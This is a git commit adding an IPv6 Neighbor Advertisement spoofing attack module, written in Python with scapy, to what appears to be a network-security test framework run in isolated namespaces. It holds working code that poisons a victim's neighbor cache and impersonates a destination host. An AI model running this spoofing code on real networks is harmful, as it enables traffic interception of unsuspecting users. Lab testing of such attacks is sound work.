91f04b147743298e2e2fc7541f19460037a41502
Willi Meißner <willi.meissner@mailbox.tu-dresden.de>
2023-08-28 22:48:24 +0200

    add ICMPv6 ND NA spoofing attack

---
+++ attacks/NDNASpoofing.py
@@ -0,0 +1,140 @@
+import time
+import subprocess
+import netns
+import scapy.all as scapy
+from lib.connectivity import *
+from pyroute2 import IPRoute
+import iptc
+
+from attacks.attack import Attack
+
+class NDNASpoofing(Attack):
+    """
+    This Attack is spoofing a IPv6 Neighbor Advertisement
+    """
+
+    def __init__(self, config: dict, interfaces: list[scapy.NetworkInterface], ip4network: ipaddress.IPv4Network):
+        super().__init__(config, interfaces, ip4network)
+        self.victim_host_num = 1
+        self.attack_host_num = 0
+        self.destination_host_num = 2
+        self.victim_interface = self.interfaces[self.victim_host_num]
+        self.attack_interface = self.interfaces[self.attack_host_num]
+        self.destination_interface = self.interfaces[self.destination_host_num]
+        self.na_spoofer = None
+        self.ping6_spoofer = None
+
+    def setup(self):
+        ans = icmping6(self.interfaces, self.victim_host_num, self.destination_interface.ips[6][0], count=1)
+        if len(ans.res) != 1:
+            raise RuntimeError("No connectivity to destination host.")
+        ans = icmping6(self.interfaces, self.victim_host_num, self.attack_interface.ips[6][0], count=1)
+        if len(ans.res) != 1:
+            raise RuntimeError("No connectivity to attacker host.")
+
+        time.sleep(6)
+
+        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
+            ipr = IPRoute()
+            cache = ipr.get_neighbours(dst=self.destination_interface.ips[6][0], lladdr=self.destination_interface.mac)
+            if len(cache) == 0:
+                raise RuntimeError("Neighbor table empty.")
+
+    def attack(self):
+        def is_request(req):
+            """
+            Check if packet req is a ND request
+            Adapted from scapy.layers.inet6
+            """
+
+            # Those simple checks are based on Section 5.4.2 of RFC 4862
+            if not (scapy.Ether in req and scapy.IPv6 in req and scapy.ICMPv6ND_NS in req):
+                return 0
+
+            # Source must NOT be the unspecified address
+            if req[scapy.IPv6].src == "::":
+                return 0
+
+            return 1
+
+        def reply_callback(req):
+            """
+            Callback that reply to a NS with a spoofed NA
+            Adapted from scapy.layers.inet6
+            """
+
+            # Let's build a reply (as defined in Section 7.2.4. of RFC 4861) and
+            # send it back.
+            reply_mac = self.interfaces[self.attack_host_num].mac
+            mac = req[scapy.Ether].src
+            pkt = req[scapy.IPv6]
+            src = pkt.src
+            tgt = req[scapy.ICMPv6ND_NS].tgt
+            rep = scapy.Ether(src=reply_mac, dst=mac) / scapy.IPv6(src=tgt, dst=src)
+            # Use the target field from the NS
+            rep /= scapy.ICMPv6ND_NA(tgt=tgt, S=1, R=0, O=1)  # noqa: E741
+
+            # "If the solicitation IP Destination Address is not a multicast
+            # address, the Target Link-Layer Address option MAY be omitted"
+            # Given our purpose, we always include it.
+            rep /= scapy.ICMPv6NDOptDstLLAddr(lladdr=reply_mac)
+
+            with netns.NetNS(nsname=f'host{self.attack_host_num}'):
+                scapy.sendp(rep, iface=self.interfaces[self.attack_host_num], verbose=0)
+
+            print("Reply NA for target address %s (received from %s)" % (tgt, mac))
+
+        sniff_filter = f"icmp6 and ether src {self.victim_interface.mac}"
+        self.na_spoofer = get_async_sniffer(self.interfaces,
+                                    self.attack_host_num,
+                                    filterstr=sniff_filter,
+                                    lfilter=is_request,
+                                    prn=reply_callback)
+        self.na_spoofer.start()
+
+        # Prevent kernel from sending NA, because it is too fast compared to scapy
+        with netns.NetNS(nsname=f'host{self.destination_host_num}'):
+            rule = {'protocol': 'icmpv6', 'icmp6': {'icmpv6-type': 'neighbour-advertisement'}, 'target': 'DROP'}
+            iptc.easy.insert_rule('filter', 'OUTPUT', rule, ipv6=True)
+
+        with netns.NetNS(nsname=f'host{self.attack_host_num}'):
+            self.ping6_spoofer = ICMP6Echo_am(interface=self.attack_interface)
+            self.ping6_spoofer(bg=True)
+
+        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
+            ipr = IPRoute()
+            ipr.neigh('del',dst=self.destination_interface.ips[6][0], ifindex=self.victim_interface.index)
+
+        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
+            subprocess.run(['ping', '-c', '3', f'{self.destination_interface.ips[6][0]}'])
+
+
+    def result(self) -> bool:
+        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
+            ipr = IPRoute()
+            cache = ipr.get_neighbours(dst=self.destination_interface.ips[6][0],
+                                       lladdr=self.attack_interface.mac)
+
+            if len(cache) > 0:
+                return True
+            else:
+                return False
+
+    def cleanup(self):
+        self.na_spoofer.stop()
+        self.ping6_spoofer.sniffer.stop()
+
+        with netns.NetNS(nsname=f'host{self.destination_host_num}'):
+            iptc.easy.flush_all(ipv6=True)
+
+        with netns.NetNS(nsname=f'host{self.victim_host_num}'):
+            ipr = IPRoute()
+            ipr.neigh('del',dst=self.destination_interface.ips[6][0], ifindex=self.victim_interface.index)
+
+    def run(self) -> bool:
+        self.setup()
+        self.attack()
+        res = self.result()
+        self.cleanup()
+
+        return res
--- lib/connectivity.py
+++ lib/connectivity.py
@@ -34,8 +34,18 @@ def icmping(interfaces: list[scapy.NetworkInterface], ifindex: int, ip: ipaddres
 
         return ans
 
-def get_async_sniffer(interfaces: list[scapy.NetworkInterface], ifindex: int, filterstr: str):
-    sniffer = AsyncSniffer(namespace=f'host{ifindex}', iface=interfaces[ifindex], filter=filterstr)
+def icmping6(interfaces: list[scapy.NetworkInterface], ifindex: int, ip: ipaddress.IPv6Address|str, count: int = 3, retry: int = 2) -> scapy.SndRcvList:
+    with netns.NetNS(nsname=f'host{ifindex}'):
+        scapy.conf.ifaces.reload()
+        scapy.conf.route6.resync()
+        src = interfaces[ifindex].ips[6][0]
+        packet = scapy.IPv6(dst=ip, src=src, nh=58) / scapy.ICMPv6EchoRequest()
+        ans, _ = scapy.srloop(packet, iface=interfaces[ifindex], timeout=3, count=count, retry=retry)
+
+        return ans
+
+def get_async_sniffer(interfaces: list[scapy.NetworkInterface], ifindex: int, filterstr: str = None, *args, **kwargs):
+    sniffer = AsyncSniffer(namespace=f'host{ifindex}', iface=interfaces[ifindex], filter=filterstr, *args, **kwargs)
 
     return sniffer
 
@@ -48,20 +58,51 @@ class AsyncSniffer(scapy.AsyncSniffer):
             scapy.conf.route.resync()
             super().__init__(*args, **kwargs)
 
-    def join(self, *args, **kwargs):  # type: (*Any, **Any) -> None:
+    def join(self, *args, **kwargs):  # type: (*Any, **Any) -> None
         with netns.NetNS(nsname=self.namespace):
             scapy.conf.ifaces.reload()
             scapy.conf.route.resync()
             super().join(*args, **kwargs)
 
-    def start(self):  # type: () -> None:
+    def start(self):  # type: () -> None
         with netns.NetNS(nsname=self.namespace):
             scapy.conf.ifaces.reload()
             scapy.conf.route.resync()
             super().start()
 
-    def stop(self, join=True):  # type: (bool) -> Optional[PacketList]|None:
+    def stop(self, join=True):  # type: (bool) -> Optional[scapy.PacketList]|None
         with netns.NetNS(nsname=self.namespace):
             scapy.conf.ifaces.reload()
             scapy.conf.route.resync()
             super().stop(join=join)
+
+
+class ICMP6Echo_am(scapy.AnsweringMachine):
+    """Responds to every ICMPv6 Echo-Requests"""
+
+    def __init__(self, interface: scapy.NetworkInterface, **kwargs):
+        self.interface = interface
+        self.send_function = staticmethod(scapy.sendp)
+        super().__init__(iface=interface.name, **kwargs)
+    def is_request(self, req: scapy.Packet) -> int:
+        if req.haslayer(scapy.ICMPv6EchoRequest):
+            return True
+        else:
+            return False
+
+    def print_reply(self, req, reply):  # type: (Packet, _T) -> None
+        pass
+
+    def make_reply(self, req: scapy.Packet):
+        src_mac = self.interface.mac
+        dst_mac = req[scapy.Ether].src
+        src = req[scapy.IPv6].dst
+        dst = req[scapy.IPv6].src
+        id = req[scapy.ICMPv6EchoRequest].id
+        data = req[scapy.ICMPv6EchoRequest].data
+        sequence = req[scapy.ICMPv6EchoRequest].seq
+        reply = scapy.Ether(dst=dst_mac, src=src_mac) \
+                / scapy.IPv6(dst=dst, src=src) \
+                / scapy.ICMPv6EchoReply(id=id, data=data, seq=sequence)
+
+        return reply
